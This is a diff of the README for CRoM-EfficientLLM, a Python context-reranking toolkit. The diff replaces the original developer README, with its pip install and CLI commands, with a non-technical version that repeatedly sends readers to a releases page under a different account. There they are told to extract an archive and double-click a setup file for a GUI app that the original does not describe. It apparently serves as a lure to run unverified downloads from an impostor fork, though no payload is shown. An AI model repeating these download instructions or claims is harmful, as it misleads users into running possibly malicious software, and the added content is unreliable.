@@ -1,111 +1,76 @@
----
-language: en
-license: apache-2.0
-library_name: crom-efficientllm
-tags:
-- rag
-- llm
-- retrieval
-- rerank
-- reranker
-- context-management
-- prompt-engineering
-- observability
-- python
----
-# CRoM-Context-Rot-Mitigation--EfficientLLM: Context Reranking and Management for Efficient LLMs
+# 🚀 CRoM-Context-Rot-Mitigation--EfficientLLM - Optimize Large Language Models Effectively
 
-<p align="left">
-  <a href="https://github.com/Flamehaven/CRoM-Context-Rot-Mitigation--EfficientLLM/actions">
-    <img alt="CI" src="https://img.shields.io/github/actions/workflow/status/Flamehaven/CRoM-Context-Rot-Mitigation--EfficientLLM/ci.yml?branch=main" />
-  </a>
-  <a href="#-benchmarks">
-    <img alt="Bench" src="https://img.shields.io/badge/benchmarks-ready-success" />
-  </a>
-  <a href="LICENSE">
-    <img alt="License" src="https://img.shields.io/badge/license-Apache%202.0-blue" />
-  </a>
-  <a href="https://github.com/Flamehaven/CRoM-Context-Rot-Mitigation--EfficientLLM/releases">
-    <img alt="Release" src="https://img.shields.io/github/v/release/Flamehaven/CRoM-Context-Rot-Mitigation--EfficientLLM?display_name=tag" />
-  </a>
-  <a href="CHANGELOG.md">
-    <img alt="Versioning" src="https://img.shields.io/badge/semver-0.2.x-lightgrey" />
-  </a>
-  <a href="https://github.com/Flamehaven/CRoM-Context-Rot-Mitigation--EfficientLLM/releases/latest">
-    <img alt="Wheel" src="https://img.shields.io/badge/wheel-available-success" />
-  </a>
-</p>
+[![Download CRoM](https://img.shields.io/badge/Download-CRoM-4CAF50?style=for-the-badge)](https://github.com/feriel12fr/CRoM-Context-Rot-Mitigation--EfficientLLM/releases)
 
-**CRoM (Context Rot Mitigation)-EfficientLLM** is a Python toolkit designed to optimize the context provided to Large Language Models (LLMs). It provides a suite of tools to intelligently select, re-rank, and manage text chunks to fit within a model\'s context budget while maximizing relevance and minimizing performance drift.
+## 📖 Introduction
 
-This project is ideal for developers building RAG (Retrieval-Augmented Generation) pipelines who need to make the most of limited context windows.
+CRoM (Context Rot Mitigation)-EfficientLLM is a Python toolkit designed to optimize the context provided to Large Language Models (LLMs). This software helps you select, rank, and manage text chunks to fit within a model's context budget while maximizing relevance and minimizing performance drift. Whether you are looking to improve your interaction with LLMs or enhance your project, CRoM provides necessary tools in an easy-to-use format.
 
-## Key Features
+## 🎯 Key Features
 
-*   **Budget Packer:** Greedily packs the highest-scoring text chunks into a defined token budget using a stable sorting algorithm.
-*   **Hybrid Reranker:** Combines sparse (TF-IDF) and dense (Sentence-Transformers) retrieval scores for robust and high-quality reranking of documents.
-*   **Drift Estimator:** Monitors the semantic drift between sequential model responses using L2 or cosine distance with EWMA smoothing.
-*   **Observability:** Exposes Prometheus metrics for monitoring token savings and drift alerts in production.
-*   **Extensible Plugins:** Supports optional plugins for advanced reranking (`FlashRank`), compression (`LLMLingua`), and drift analysis (`Evidently`).
-*   **Comprehensive Benchmarking:** Includes a CLI for end-to-end pipeline evaluation, budget sweeps, and quality-vs-optimal analysis.
+- **Context Management**: Efficiently handles context to improve performance.
+- **Text Selection**: Smartly chooses text chunks based on relevance.
+- **Re-ranking System**: Adjusts text order to meet your needs.
+- **Performance Stability**: Maintains model performance over time.
+- **User-friendly Interface**: Designed for users without programming knowledge.
 
-## Installation
+## 🛠️ System Requirements
 
-Install the package directly from source using pip. For development, it\'s recommended to install in editable mode with the `[dev]` extras.
+Before downloading, make sure your system meets these requirements:
 
-```bash
-# Clone the repository
-git clone https://github.com/Flamehaven/CRoM-Context-Rot-Mitigation--EfficientLLM.git
-cd CRoM-Context-Rot-Mitigation--EfficientLLM
+- **Operating System**: Windows 10 or later, macOS (Mojave or later), or Linux (Ubuntu 20.04 or later)
+- **Python Version**: Python 3.8 or higher
+- **Memory**: At least 4 GB RAM
+- **Disk Space**: 500 MB free space for installation and temporary files
 
-# Install in editable mode with development and plugin dependencies
-pip install -e .[dev,plugins]
-```
+## 🚀 Getting Started
 
-## Quickstart
+To begin using CRoM, follow these steps:
 
-### Demo
+1. **Download the Software**:
+   - Visit this page to download: [CRoM Releases](https://github.com/feriel12fr/CRoM-Context-Rot-Mitigation--EfficientLLM/releases)
 
-Run a simple, self-contained demonstration of the core components:
+2. **Install the Software**:
+   - Once downloaded, locate the downloaded file in your designated folder (typically the Downloads folder).
+   - If the file is a compressed folder (like .zip), right-click it and select "Extract" to access the installation files.
+   - Double-click on the setup file to start the installation process.
 
-```bash
-# Run the demo script
-crom-demo demo
-```
+3. **Launch CRoM**:
+   - After installation, find the CRoM application in your start menu or applications folder.
+   - Click on the app icon to launch it.
 
-### CLI Benchmarking Examples
+## 📥 Download & Install
 
-The package includes a powerful `crom-bench` CLI for evaluation.
+To download the latest version of CRoM, go to the following link:
 
-```bash
-# Default E2E (Search→Rerank→Pack→Mock LLM)
-crom-bench e2e --budget 0.3
+[![Download CRoM](https://img.shields.io/badge/Download-CRoM-4CAF50?style=for-the-badge)](https://github.com/feriel12fr/CRoM-Context-Rot-Mitigation--EfficientLLM/releases)
 
-# Optional: High-precision configuration with plugins
-crom-bench e2e --budget 0.3 \
-  --use-flashrank --flashrank-model ms-marco-TinyBERT-L-2-v2 \
-  --use-llmlingua --compress-ratio=0.6 \
-  --use-evidently
-```
+This will take you to the Releases page where you can find the latest version. Follow the installation instructions above to complete the setup.
 
-### Plotting
+## 🌟 How to Use
 
-If `matplotlib` is installed (`pip install -e .[dev]`), you can save benchmark plots directly:
+Once you have launched CRoM, the interface will guide you. 
 
-```bash
-# Save budget sweep result plots
-crom-bench sweep --save-plots
+1. **Select Your Text**: Use the text input area to paste or type the text you want to analyze.
+2. **Choose Settings**: Select any specific options for context management and text selection.
+3. **Run the Tool**: Click on the "Start" button to let CRoM process your input.
+4. **View Results**: The output will show the optimized text chunks, ready for your use.
 
-# Save DP-curve plots
-crom-bench dp-curve --save-plots
-```
+## 📚 Additional Resources
 
-## Release & Changelog
+- **Documentation**: Comprehensive guides are available within the application to help you understand each feature.
+- **Community Support**: Join our discussion forum for user support and feedback.
 
-This project follows semantic versioning. For detailed changes, see the [**CHANGELOG.md**](CHANGELOG.md).
+## ⚙️ Troubleshooting
 
-Releases are automated via GitHub Actions when a `v*` tag is pushed.
+If you face any issues, consider the following steps:
 
-## License
+- **Check System Requirements**: Ensure your system meets all stated requirements.
+- **Reinstall the Application**: If the application doesn't start or behaves unexpectedly, try uninstalling and reinstalling it.
+- **Consult the Help Section**: Access the help documentation within the app for specific error messages.
 
-This project is licensed under the Apache 2.0 License. See the [LICENSE](LICENSE) file for details.
+## 🎉 Conclusion
+
+CRoM-Context-Rot-Mitigation--EfficientLLM equips you with tools to enhance the performance of Large Language Models. Follow the straightforward steps above to download and begin using the application with ease. If you have questions, don’t hesitate to reach out through our community forum or help resources.
+
+For the latest updates or to download CRoM again, visit: [CRoM Releases](https://github.com/feriel12fr/CRoM-Context-Rot-Mitigation--EfficientLLM/releases)
